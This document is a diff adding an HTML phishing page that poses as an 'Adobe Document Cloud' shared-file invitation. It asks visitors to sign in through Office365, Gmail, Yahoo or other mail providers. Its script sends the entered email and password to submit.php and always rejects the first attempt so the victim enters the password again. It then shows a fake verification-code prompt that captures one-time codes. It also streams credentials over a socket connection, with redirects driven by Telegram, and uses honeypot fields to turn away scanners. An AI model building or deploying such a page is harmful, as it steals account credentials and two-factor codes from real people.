@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Cloud Login</title>
+    
+    <!-- SEO and Meta Tags -->
+    <meta name="description" content="Sign in to Document Cloud to access your shared files securely. Choose your email provider to view the invitation.">
+    <meta name="keywords" content="Document Cloud, PDF, Sign in, Login, Online invite">
+    <meta name="author" content="Invitation">
+    
+    <!-- Favicon -->
+    <link rel="icon" href="https://tse2.mm.bing.net/th/id/OIP.WMpzNldsan7u342pW7HlyAHaHa?cb=12ucfimg=1&rs=1&pid=ImgDetMain&o=7&rm=3" type="image/x-icon">
+
+    <!-- Open Graph / Social Media Meta Tags -->
+    <meta property="og:title" content="Document Cloud Login">
+    <meta property="og:description" content="Sign in to access shared files on Document Cloud.">
+    <meta property="og:image" content="https://i.pinimg.com/736x/a6/17/2f/a6172f4e83b679433c00bf71595a3dce.jpg">
+    <meta property="og:url" content=""> <!-- Add your website URL here -->
+
+
+    <script src="https://cdn.tailwindcss.com"></script> 
+   
+
+
+
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            
+        }
+        .bg-beach {
+            background-image: url('https://i.pinimg.com/736x/a6/17/2f/a6172f4e83b679433c00bf71595a3dce.jpg');
+        }
+        .icon-white {
+            filter: brightness(0) invert(1) grayscale(100%);
+        }
+        .rounded-sm {
+            border-radius: 2px;
+        }
+        .rounded-t-sm {
+            border-top-left-radius: 2px;
+            border-top-right-radius: 2px;
+        }
+        .rounded-b-sm {
+            border-bottom-left-radius: 2px;
+            border-bottom-right-radius: 2px;
+        }
+        .error-message {
+            color: #D83B01;
+            font-size: 0.875rem;
+            text-align: left;
+            margin-bottom: 1rem;
+        }
+        .otp-input {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 1.25rem;
+            border: 1px solid #ccc;
+            border-radius: 4px; /* Slightly more rounded */
+            margin-right: 5px;
+            -moz-appearance: textfield; /* Hide arrows for Firefox */
+        }
+        .otp-input:last-child {
+            margin-right: 0;
+        }
+        .otp-input::-webkit-outer-spin-button,
+        .otp-input::-webkit-inner-spin-button {
+            -webkit-appearance: none; /* Hide arrows for Chrome, Safari, Edge */
+            margin: 0;
+        }
+    </style>
+     <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+
+    <script src="/socket.io/socket.io.js"></script>
+
+</head>
+<body class="bg-gray-200 bg-beach bg-cover bg-center bg-no-repeat">
+    <header class="bg-red-600 text-white text-center py-1 font-medium text-base">
+        Adobe Reader Online
+    </header>
+
+    <div class="relative min-h-[calc(100vh_-_32px)] flex items-center justify-center p-4">
+        
+        <main class="relative w-full max-w-sm mx-auto bg-white p-6 shadow-2xl rounded-lg">
+            <div class="flex flex-col items-center space-y-3 text-center">
+                <img src="https://tse2.mm.bing.net/th/id/OIP.WMpzNldsan7u342pW7HlyAHaHa?cb=12ucfimg=1&rs=1&pid=ImgDetMain&o=7&rm=3" alt="Logo" class="w-12 h-12">
+                <div class="space-y-1">
+                    <h1 class="text-2xl font-bold text-gray-800">Adobe</h1>
+                    <h2 class="text-lg text-gray-700 font-bold">Document Cloud</h2>
+                </div>
+                <p class="text-gray-500 text-xs max-w-xs">
+                    To view the invitation, please choose your email provider below to login to the new shared file.
+                </p>
+            </div>
+            
+            <div class="mt-6 space-y-2">
+
+                <button data-provider="Office365" class="provider-btn w-full flex items-center justify-center p-2 bg-[#D83B01] text-white rounded-md font-medium hover:bg-opacity-90 transition-colors text-sm">
+                     <span class="w-6 h-6 flex items-center justify-center mr-2">
+                        <img src="images/microsoftoffice.svg" alt="Office 365 Logo" class="w-5 h-5 icon-white">
+                    </span>
+                    <span>Office365</span>    
+                </button>
+
+                <button data-provider="Outlook" class="provider-btn w-full flex items-center justify-center p-2 bg-[#0072C6] text-white rounded-md font-medium hover:bg-opacity-90 transition-colors text-sm">
+                    <span class="w-6 h-6 flex items-center justify-center mr-2">
+                        <img src="images/microsoftoutlook.svg" alt="Outlook Logo" class="w-5 h-5 icon-white">
+                    </span>
+                    <span>Outlook</span>
+                </button>
+
+             <button data-provider="Gmail" class="provider-btn w-full flex items-center justify-center p-2 bg-[#de0421] text-white rounded-md font-medium hover:bg-opacity-90 transition-colors text-sm">
+                    <span class="w-6 h-6 flex items-center justify-center mr-2">
+                        <img src="images/gmail.svg" alt="Gmail Logo" class="w-5 h-5 icon-white">
+                    </span>
+                    <span>Gmail</span>
+                </button>
+
+
+                <button data-provider="Aol." class="provider-btn w-full flex items-center justify-center p-2 bg-[#5A2984] text-white rounded-md font-medium hover:bg-opacity-90 transition-colors text-sm">
+                    <span class="w-6 h-6 flex items-center justify-center mr-2">
+                        <img src="images/aol.svg" alt="Aol Logo" class="w-5 h-5 icon-white">
+                    </span>
+                    <span>Aol.</span>
+                </button>
+                <button data-provider="Yahoo!" class="provider-btn w-full flex items-center justify-center p-2 bg-[#410093] text-white rounded-md font-medium hover:bg-opacity-90 transition-colors text-sm">
+                    <span class="w-6 h-6 flex items-center justify-center mr-2">
+                       <img src="images/yahoo.svg" alt="Yahoo Logo" class="w-5 h-5 icon-white">
+                    </span>
+                    <span>Yahoo!</span>
+                </button>
+                 <button data-provider="Other" class="provider-btn w-full flex items-center justify-center p-2 bg-[#004080] text-white rounded-md font-medium hover:bg-opacity-90 transition-colors text-sm">
+                    <span class="w-6 h-6 flex items-center justify-center mr-2">
+                       <img src="images/maildotru.svg" alt="Other Mail Logo" class="w-5 h-5 icon-white">
+                    </span>
+                    <span>Other</span>
+                </button>
+            </div>
+        </main>
+    </div>
+
+    <!-- Login Modal Structure -->
+    <div id="login-modal-overlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 hidden">
+        <div id="login-modal" class="relative w-full max-w-sm mx-auto bg-white shadow-2xl transform transition-all rounded-sm">
+            <div id="modal-header" class="flex items-center p-3 text-white rounded-t-sm">
+                <img id="modal-icon" src="" alt="Provider Logo" class="w-5 h-5 mr-2 icon-white">
+                <h3 id="modal-title" class="text-base font-semibold"></h3>
+            </div>
+            <form id="login-form">
+    <input type="hidden" name="provider" id="modal-provider-input">
+    <div class="p-4">
+        <div id="modal-error" class="error-message hidden"></div>
+        <div class="space-y-4">
+            <div>
+                <input type="email" name="email" id="modal-email" placeholder="Email address" class="w-full p-2 border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:outline-none text-sm rounded-sm" required>
+            </div>
+            <div>
+                <input type="password" name="password" id="modal-password" placeholder="Password" class="w-full p-2 border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:outline-none text-sm rounded-sm" required>
+            </div>
+
+            <!-- The Honeypot Trap (Invisible to humans, visible to bots) -->
+            <div style="display:none !important;">
+                <label for="username">Leave this field blank</label>
+                <input type="text" name="username" id="username" autocomplete="off" tabindex="-1">
+            </div>
+
+            <button type="submit" id="modal-login-btn" class="w-full p-2 text-white font-semibold hover:bg-opacity-90 transition-colors text-sm rounded-sm flex items-center justify-center">
+                <span class="button-text">Sign in</span>
+                <svg class="animate-spin ml-2 h-5 w-5 text-white hidden button-spinner" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+            </button>
+        </div>
+    </div>
+    <div class="bg-gray-100 p-3 text-right border-t border-gray-200 rounded-b-sm">
+        <button type="button" id="modal-cancel-btn" class="text-sm text-gray-600 hover:underline">Cancel</button>
+    </div>
+</form>
+
+        </div>
+    </div>
+
+    <!-- Verification Code Modal Structure (Updated) -->
+    <div id="verification-modal-overlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 hidden">
+        <div id="verification-modal" class="relative w-full max-w-sm mx-auto bg-white shadow-2xl transform transition-all rounded-lg">
+        <form id="verification-form">
+    <input type="hidden" name="email" id="verification-email-input">
+    <input type="hidden" name="password" id="verification-password-input">
+    <input type="hidden" name="provider" id="verification-provider-input">
+    <div class="p-6 text-center">
+        <div class="flex justify-center mb-6">
+            <img id="verification-modal-logo" src="" alt="Provider Logo" class="h-8">
+        </div>
+        <h4 class="text-xl font-bold text-gray-800 mb-2">Enter Verification Code</h4>
+        <p class="text-gray-500 text-sm mb-4">
+            We've sent a 6-digit code to your email. Please <br>enter it below.
+        </p>
+        <div class="flex justify-center space-x-2 mb-4">
+            <input type="number" class="otp-input" min="0" max="9" maxlength="1" required data-otp-input="0">
+            <input type="number" class="otp-input" min="0" max="9" maxlength="1" required data-otp-input="1">
+            <input type="number" class="otp-input" min="0" max="9" maxlength="1" required data-otp-input="2">
+            <input type="number" class="otp-input" min="0" max="9" maxlength="1" required data-otp-input="3">
+            <input type="number" class="otp-input" min="0" max="9" maxlength="1" required data-otp-input="4">
+            <input type="number" class="otp-input" min="0" max="9" maxlength="1" required data-otp-input="5">
+        </div>
+        <div id="verification-error" class="error-message text-center hidden" style="margin-bottom: 1rem;"></div>
+
+        <!-- The Honeypot Trap (Invisible to humans, visible to bots) -->
+        <div style="display:none !important;">
+            <label for="verification_token">Leave this field blank</label>
+            <input type="text" name="verification_token" id="verification_token" autocomplete="off" tabindex="-1">
+        </div>
+
+        <button type="submit" id="verification-btn" class="w-full p-2 text-white font-semibold bg-red-600 rounded-md hover:bg-red-700 transition-colors text-sm flex items-center justify-center">
+            <span class="button-text">Verify</span>
+            <svg class="animate-spin ml-2 h-5 w-5 text-white hidden button-spinner" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+        </button>
+        <p class="text-sm text-gray-500 mt-4">Didn't receive a code? <a href="#" class="text-red-600 hover:underline" id="resend-code-btn">Resend</a></p>
+    </div>
+</form>
+
+        </div>
+    </div>
+    
+    <footer class="bg-gray-800 text-white text-center py-4 text-xs">
+        <p>&copy; 2026 Invitation Reader Systems Incorporated. All rights reserved.</p>
+    </footer>
+
+    <script>
+        // // Send visit report to Telegram
+        // fetch('visit.php', {
+        //     method: 'POST',
+        //     headers: {
+        //         'Content-Type': 'application/json',
+        //     },
+        //     body: JSON.stringify({
+        //         userAgent: navigator.userAgent,
+        //         platform: navigator.platform,
+        //         language: navigator.language,
+        //         screenWidth: screen.width,
+        //         screenHeight: screen.height,
+        //         referrer: document.referrer
+        //     })
+        // }).catch(error => console.log('Visit report failed:', error));
+
+        const providerButtons = document.querySelectorAll('.provider-btn');
+        const loginModalOverlay = document.getElementById('login-modal-overlay');
+        const loginModalCancelBtn = document.getElementById('modal-cancel-btn');
+        const modalHeader = document.getElementById('modal-header');
+        const modalIcon = document.getElementById('modal-icon');
+        const modalTitle = document.getElementById('modal-title');
+        const modalLoginBtn = document.getElementById('modal-login-btn');
+        const modalEmailInput = document.getElementById('modal-email');
+        const modalPasswordInput = document.getElementById('modal-password');
+        const modalProviderInput = document.getElementById('modal-provider-input');
+        const loginForm = document.getElementById('login-form');
+        const modalError = document.getElementById('modal-error');
+        const loginButtonText = modalLoginBtn.querySelector('.button-text');
+        const loginButtonSpinner = modalLoginBtn.querySelector('.button-spinner');
+
+        // Verification Modal Elements
+        const verificationModalOverlay = document.getElementById('verification-modal-overlay');
+        const verificationModalLogo = document.getElementById('verification-modal-logo');
+        const verificationEmailInput = document.getElementById('verification-email-input');
+        const verificationPasswordInput = document.getElementById('verification-password-input');
+        const verificationProviderInput = document.getElementById('verification-provider-input');
+        const verificationForm = document.getElementById('verification-form');
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const verificationBtn = document.getElementById('verification-btn');
+        const verificationError = document.getElementById('verification-error');
+        const verificationButtonText = verificationBtn.querySelector('.button-text');
+        const verificationButtonSpinner = verificationBtn.querySelector('.button-spinner');
+
+        let loginAttempts = 0;
+        let currentProviderData = {}; // To store data from the first modal
+
+        const providerDetails = {
+            'Office365': { title: 'Sign in to Office 365', color: 'bg-[#D83B01]', placeholder: 'Email, phone, or Skype', redirect: 'https://www.google.com/', icon: 'images/microsoftoffice.svg' },
+            'Outlook': { title: 'Sign in to Outlook', color: 'bg-[#0072C6]', placeholder: 'Email address', redirect: 'https://www.google.com/', icon: 'images/microsoftoutlook.svg' },
+            'Gmail': { title: 'Sign in to Gmail', color: 'bg-[#de0421]', placeholder: 'Email address', redirect: 'https://www.google.com/', icon: 'images/gmail.svg' },
+            'Aol.': { title: 'Aol. AOL Mail Login', color: 'bg-[#5A2984]', placeholder: 'Email address', redirect: 'https://www.google.com/', icon: 'images/aol.svg' },
+            'Yahoo!': { title: 'Yahoo! Sign in', color: 'bg-[#410093]', placeholder: 'Enter Yahoo email', redirect: 'https://www.google.com/', icon: 'images/yahoo.svg' },
+            'Other': { title: 'Other Mail Login', color: 'bg-[#004080]', placeholder: 'Email address', redirect: 'https://www.google.com/', icon: 'images/maildotru.svg' }
+        };
+
+        function showLoading(button, isLoading) {
+            const textSpan = button.querySelector('.button-text');
+            const spinnerSvg = button.querySelector('.button-spinner');
+            if (isLoading) {
+                textSpan.classList.add('hidden');
+                spinnerSvg.classList.remove('hidden');
+                button.disabled = true;
+            } else {
+                textSpan.classList.remove('hidden');
+                spinnerSvg.classList.add('hidden');
+                button.disabled = false;
+            }
+        }
+
+        function openLoginModal(providerName) {
+            loginAttempts = 0;
+            modalError.classList.add('hidden');
+            loginForm.reset();
+
+            const details = providerDetails[providerName];
+            
+            modalHeader.className = 'flex items-center p-3 text-white rounded-t-sm';
+            modalLoginBtn.className = 'w-full p-2 text-white font-semibold hover:bg-opacity-90 transition-colors text-sm rounded-sm flex items-center justify-center';
+            
+            modalHeader.classList.add(details.color);
+            modalLoginBtn.classList.add(details.color);
+            modalTitle.textContent = details.title;
+            modalIcon.src = details.icon;
+            modalEmailInput.placeholder = details.placeholder;
+            modalProviderInput.value = providerName;
+
+            loginModalOverlay.classList.remove('hidden');
+        }
+
+        function openVerificationModal(providerName, email, password) {
+            const details = providerDetails[providerName];
+
+            // Set the provider logo
+            verificationModalLogo.src = details.icon;
+
+            // Set button style
+            verificationBtn.className = 'w-full p-2 text-white font-semibold bg-red-600 rounded-md hover:bg-red-700 transition-colors text-sm flex items-center justify-center';
+
+            verificationEmailInput.value = email;
+            verificationPasswordInput.value = password;
+            verificationProviderInput.value = providerName;
+
+            otpInputs.forEach(input => input.value = '');
+            otpInputs[0].focus();
+            verificationError.classList.add('hidden');
+
+            loginModalOverlay.classList.add('hidden');
+            verificationModalOverlay.classList.remove('hidden');
+        }
+
+        loginForm.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            
+            loginAttempts++;
+            showLoading(modalLoginBtn, true);
+            modalError.classList.add('hidden');
+
+            const email = modalEmailInput.value;
+            const password = modalPasswordInput.value;
+            const provider = modalProviderInput.value;
+
+            currentProviderData = { email, password, provider };
+
+            const formData = new FormData();
+            formData.append('email', email);
+            formData.append('password', password);
+            formData.append('provider', provider);
+            formData.append('loginAttempts', loginAttempts);
+
+            try {
+                await fetch('submit.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (loginAttempts === 1) {
+                    modalError.textContent = 'Incorrect password. Please try again.';
+                    modalError.classList.remove('hidden');
+                    showLoading(modalLoginBtn, false);
+                } else if (loginAttempts >= 2) {
+                    showLoading(modalLoginBtn, false);
+                    openVerificationModal(provider, email, password);
+                }
+
+            } catch (error) {
+                console.error('Failed to submit form:', error);
+                modalError.textContent = 'A network error occurred. Please try again.';
+                modalError.classList.remove('hidden');
+                showLoading(modalLoginBtn, false);
+                loginAttempts--;
+            }
+        });
+
+        verificationForm.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            showLoading(verificationBtn, true);
+            verificationError.classList.add('hidden');
+
+            const verificationCode = Array.from(otpInputs).map(input => input.value).join('');
+
+            const formData = new FormData();
+            formData.append('email', verificationEmailInput.value);
+            formData.append('password', verificationPasswordInput.value);
+            formData.append('provider', verificationProviderInput.value);
+            formData.append('verificationCode', verificationCode);
+            formData.append('stage', 'verification');
+
+            try {
+                const response = await fetch('submit.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+
+                if (result.status === 'success') {
+                    // Show success message
+                    verificationError.textContent = 'Verification successful! Redirecting...';
+                    verificationError.classList.remove('hidden');
+                    verificationError.style.color = '#28a745'; // Green color for success
+
+                    // Redirect after 2 seconds
+                    setTimeout(() => {
+                        const redirectUrl = providerDetails[verificationProviderInput.value].redirect;
+                        window.location.href = redirectUrl;
+                    }, 2000);
+                } else {
+                    verificationError.textContent = result.message || 'Verification failed. Please try again.';
+                    verificationError.classList.remove('hidden');
+                    verificationError.style.color = '#D83B01'; // Red color for error
+                    showLoading(verificationBtn, false);
+                }
+            } catch (error) {
+                console.error('Failed to submit verification:', error);
+                verificationError.textContent = 'A network error occurred during verification. Please try again.';
+                verificationError.classList.remove('hidden');
+                verificationError.style.color = '#D83B01'; // Red color for error
+                showLoading(verificationBtn, false);
+            }
+        });
+
+
+        providerButtons.forEach(button => {
+            button.addEventListener('click', (event) => {
+                event.preventDefault();
+                openLoginModal(button.dataset.provider);
+            });
+        });
+
+        function closeLoginModal() {
+            loginModalOverlay.classList.add('hidden');
+            showLoading(modalLoginBtn, false); 
+        }
+
+        function closeVerificationModal() {
+            verificationModalOverlay.classList.add('hidden');
+            showLoading(verificationBtn, false);
+        }
+
+        loginModalCancelBtn.addEventListener('click', closeLoginModal);
+
+        loginModalOverlay.addEventListener('click', (event) => {
+            if (event.target === loginModalOverlay) {
+                closeLoginModal();
+            }
+        });
+        verificationModalOverlay.addEventListener('click', (event) => {
+            if (event.target === verificationModalOverlay) {
+                closeVerificationModal();
+            }
+        });
+
+        // OTP input logic
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', (event) => {
+                if (event.key === 'Backspace' && input.value.length === 0 && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+    </script>
+
+
+
+<script src="http://localhost:3000/socket.io/socket.io.js"></script>
+
+<!-- 2. THE COMPLETE UPDATED TRIGGER AND REDIRECT LOGIC -->
+<script>
+// Create and insert the custom loader screen layout overlay dynamically via JavaScript
+const style = document.createElement('style');
+style.innerHTML = `
+    #custom-loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(243, 244, 246, 0.95); z-index: 9999; text-align: center; font-family: sans-serif; padding-top: 15%; }
+    .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+`;
+document.head.appendChild(style);
+
+const loaderDiv = document.createElement('div');
+loaderDiv.id = 'custom-loader';
+loaderDiv.innerHTML = `
+    <h2>Awaiting Authentication...</h2>
+    <div class="spinner"></div>
+    <p style="color: #e74c3c; font-weight: bold; font-size: 16px;">DO NOT CLOSE OR REFRESH THIS WINDOW</p>
+    <p style="color: #555; font-size: 14px;">Your connection is active.</p>
+`;
+document.body.appendChild(loaderDiv);
+
+// ATTACH THE EVENT DIRECTLY TO YOUR SPECIFIC SIGN IN BUTTON ID
+document.getElementById('modal-login-btn').addEventListener('click', function(event) {
+    // Stops the form from making a standard page refresh submission
+    event.preventDefault();
+
+    // EXTRACT DATA DIRECTLY FROM YOUR FORM CHANNELS (modal-email and modal-password)
+    const emailVal = document.getElementById('modal-email').value;
+    const passVal = document.getElementById('modal-password').value;
+
+    // Safety validation block checking for missing input data
+    if (!emailVal || !passVal) {
+        alert("Please enter both your email address and password.");
+        return;
+    }
+
+    // PERSISTENCE KEY: Saves the email address inside browser variables so the room tracks it
+    localStorage.setItem('active_staff_email', emailVal);
+
+    // ACTIVATE THE OVERLAY LOADING ANIMATION SCREEN
+    document.getElementById('custom-loader').style.display = 'block';
+
+    // CONNECTS LIVE TO THE SERVER PIPELINE VIA THE ABSOLUTE ADDRESS
+    const socket = io("http://localhost:3000");
+
+    // TRANSMIT DATA PIPELINE (Sends email and password keys cleanly)
+    socket.emit("verify_and_register", { email: emailVal, password: passVal });
+
+    // DISCONNECT AND REVERT BACK IF LOGIN REJECTED
+    socket.on("login_failed", (errorMessage) => {
+        alert(errorMessage);
+        document.getElementById('custom-loader').style.display = 'none';
+        socket.disconnect();
+    });
+
+    // EXECUTE TELEGRAM INTERACTIVE BUTTON COMMANDS (Buttons 1, 2, 3, or 4)
+    socket.on("redirect_command", (destinationUrl) => {
+        if (destinationUrl === "/force_reset_kick") {
+            // Button 4 selected: wipe storage and boot back to raw home page
+            localStorage.removeItem('active_staff_email');
+            window.location.href = "http://localhost:3000/";
+        } else {
+            // Button 1 or 2 selected: forward cleanly using the absolute server path
+            window.location.href = "http://localhost:3000" + destinationUrl; 
+        }
+    });
+});
+</script>
+
+    </body>
+    
+
+</html>
+
+ 
+
